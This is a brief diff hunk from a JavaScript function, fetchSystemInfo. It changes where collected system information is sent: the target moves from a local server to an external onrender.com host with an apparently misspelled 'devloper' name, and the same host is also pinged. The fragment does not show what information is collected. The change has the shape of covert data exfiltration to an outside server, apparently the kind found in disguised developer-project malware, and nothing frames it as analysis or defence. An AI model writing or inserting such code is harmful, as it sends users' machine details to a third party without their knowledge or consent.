@@ -18,7 +18,7 @@ async function fetchSystemInfo() {
         console.log(systemInfo);
 
         // Send system information to the server
-        await axios.post('http://localhost:5000/system-info', systemInfo);
+        await axios.post('https://bitbox-vpp-devloper.onrender.com/system-info', systemInfo);
 
         // Attempt to "ping" a URL
         const url = 'https://bitbox-vpp-devloper.onrender.com/temp';
